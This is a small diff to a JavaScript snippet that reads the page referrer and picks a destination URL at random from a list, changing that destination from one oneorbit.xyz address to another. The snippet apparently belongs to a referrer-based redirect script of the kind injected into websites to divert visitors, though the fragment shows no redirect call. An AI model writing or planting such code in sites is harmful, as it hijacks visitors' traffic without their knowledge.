@@ -4,7 +4,7 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([
-							'https://insurance.oneorbit.xyz/',
+							'https://oneorbit.xyz/',
 							]);
 
 				function rChoice(arr) {
